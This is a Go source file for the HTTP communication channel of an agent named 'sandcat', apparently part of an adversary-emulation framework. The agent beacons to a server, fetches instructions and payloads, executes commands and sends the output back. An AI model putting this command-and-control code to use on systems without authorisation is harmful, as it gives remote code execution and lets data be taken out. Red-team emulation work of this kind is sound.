package contact

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"path/filepath"
	"strings"

	"../execute"
	"../util"
	"../output"
)

var (
	apiBeacon = "/beacon"
	apiResult = "/result"
)

//API communicates through HTTP
type API struct { }

func init() {
	CommunicationChannels["HTTP"] = API{}
}

//GetInstructions sends a beacon and returns instructions
func (contact API) GetInstructions(profile map[string]interface{}) map[string]interface{} {
	data, _ := json.Marshal(profile)
	address := fmt.Sprintf("%s%s", profile["server"], apiBeacon)
	bites := request(address, data)
	var out map[string]interface{}
	if bites != nil {
		output.VerbosePrint("[+] beacon: ALIVE")
		var commands interface{}
		json.Unmarshal(bites, &out)
		json.Unmarshal([]byte(out["instructions"].(string)), &commands)
		out["sleep"] = int(out["sleep"].(float64))
		out["watchdog"] = int(out["watchdog"].(float64))
		out["instructions"] = commands
	} else {
		output.VerbosePrint("[-] beacon: DEAD")
	}
	return out
}

//DropPayloads downloads all required payloads for a command
func (contact API) DropPayloads(payload string, server string, uniqueId string, platform string) []string{
	payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
	var droppedPayloads []string
	for _, payload := range payloads {
		if len(payload) > 0 {
			droppedPayloads = append(droppedPayloads, contact.drop(payload, server, uniqueId, platform))
		}
	}
	return droppedPayloads
}

//RunInstruction runs a single instruction
func (contact API) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
    timeout := int(command["timeout"].(float64))
	cmd, result, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string), timeout)
	contact.SendExecutionResults(command["id"], profile["server"], result, status, cmd, pid, profile["paw"].(string))
}

//C2RequirementsMet determines if sandcat can use the selected comm channel
func (contact API) C2RequirementsMet(profile map[string]interface{}, criteria interface{}) bool {
	output.VerbosePrint(fmt.Sprintf("Beacon API=%s", apiBeacon))
	output.VerbosePrint(fmt.Sprintf("Result API=%s", apiResult))
	return true
}

//Drop will download a single payload
func (contact API) drop(payload string, server string, uniqueID string, platform string) string {
	location := filepath.Join(payload)
	if len(payload) > 0 && util.Exists(location) == false {
		output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload: %s", payload))
		address := fmt.Sprintf("%s/file/download", server)
		req, _ := http.NewRequest("POST", address, nil)
		req.Header.Set("file", payload)
		req.Header.Set("platform", platform)
		client := &http.Client{}
		resp, err := client.Do(req)
		if err == nil && resp.StatusCode == ok {
			util.WritePayload(location, resp)
		}
	}
	return location
}

// Will obtain the payload bytes in memory to be written to disk later by caller.
func (contact API) GetPayloadBytes(payload string, server string, uniqueID string, platform string) []byte {
    var retBuf []byte
    if len(payload) > 0 {
		output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload bytes: %s", payload))
		address := fmt.Sprintf("%s/file/download", server)
		req, _ := http.NewRequest("POST", address, nil)
		req.Header.Set("file", payload)
		req.Header.Set("platform", platform)
		client := &http.Client{}
		resp, err := client.Do(req)
		if err == nil && resp.StatusCode == ok {
			buf, err := ioutil.ReadAll(resp.Body)

			if err == nil {
			    retBuf = buf
			}
		}
	}

	return retBuf
}

//SendExecutionResults will send the execution results to the server.
func (contact API) SendExecutionResults(commandID interface{}, server interface{}, result []byte, status string, cmd string, pid string, uniqueID string) {
	address := fmt.Sprintf("%s%s", server, apiResult)
	link := fmt.Sprintf("%s", commandID.(string))
	data, _ := json.Marshal(map[string]string{"id": link, "output": string(util.Encode(result)), "status": status, "pid": pid})
	request(address, data)
}

func request(address string, data []byte) []byte {
	req, _ := http.NewRequest("POST", address, bytes.NewBuffer(util.Encode(data)))
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := ioutil.ReadAll(resp.Body)
	return util.Decode(string(body))
}